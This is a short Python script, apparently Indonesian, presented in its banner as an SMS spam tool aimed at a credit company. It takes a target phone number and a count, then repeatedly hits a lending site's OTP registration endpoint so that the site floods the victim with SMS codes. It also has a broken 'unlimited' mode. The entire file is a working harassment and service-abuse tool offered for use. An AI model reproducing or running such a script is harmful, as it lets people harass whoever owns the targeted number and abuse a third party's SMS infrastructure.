try:
       import json, os, sys, requests, time
except ImportError as error:exit("[x] Module belum diinstall, ketik perintah 'pip install requests'")

r = requests
def banner():
    print ("""\x1b[1;93m██   ██ ██████  ███████ ██████  ██ ████████ ██████  ██      ██    ██ ███████ 
\x1b[1;91m██  ██  ██   ██ ██      ██   ██ ██    ██    ██   ██ ██      ██    ██ ██      
\x1b[1;94m█████   ██████  █████   ██   ██ ██    ██    ██████  ██      ██    ██ ███████ 
\x1b[1;96m██  ██  ██   ██ ██      ██   ██ ██    ██    ██      ██      ██    ██      ██ 
\x1b[1;92m██   ██ ██   ██ ███████ ██████  ██    ██    ██      ███████  ██████  ███████ 
                                                                             """)
try:
    banner()
    os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
    os.system("echo Nama Tool: Spam Sms KreditPlus | lolcat -a")
    os.system("echo Author: ANKER PRODUCTION | lolcat -a")
    os.system("echo Whatsapp: +628×××××××××××× | lolcat -a")
    os.system("echo Github: https://github.com/4NK3R-PRODUCT1ON | lolcat -a")
    os.system("echo Youtube: ANKER PRODUCTION | lolcat -a")
    os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
except KeyboardInterrupt:exit("[-] Ok, keluar")
try:
        no = sys.argv[1]
        jum = int(sys.argv[2])
        if jum == '999':
                   for x in range(99999999999999999999):
                           ngehe1 = r.get("http://kreditmu.com/registration/getOtpResponse/"+no)
                           detect1 = json.loads(ngehe1.text)
                           goblok1 = detect1['Status']
                           if goblok1 == '0':
                                    print ("\x1b[1;92m[\x1b[1;93m+\x1b[1;92m]\x1b[\x1b[1;96m Succes mengirim spam ke "+no)
                           else:
                                    print ("\x1b[1;91m[\x1b[1;93m-\x1b[1;92m]\x1b[1;91m Gagal mengirim spam ke "+no)
        for x in range(jum):
                ngehe = r.get("http://kreditmu.com/registration/getOtpResponse/"+no)
                detect = json.loads(ngehe.text)
                goblok = detect['Status']
                if goblok == '0':
                         print ("\x1b[1;92m[\x1b[1;93m+\x1b[1;92m]\x1b[1;96m Succes mengirim spam ke "+no)
                else:
                         print ("\x1b[1;91m[\x1b[1;93m-\x1b[1;92m]\x1b[1;91m Gagal mengirim spam ke "+no)

except KeyboardInterrupt:exit("[-] Ok, keluar")
except IndexError:exit("\x1b[1;92m[-\x1b[1;92m] \x1b[1;93mUsage : python spam11.py <nomor> <jumlah>\n\x1b[1;92m[+\x1b[1;92m] \x1b[1;93mSpecial command : python spam11.py <nomor> [999] (Unlimited Spam)")

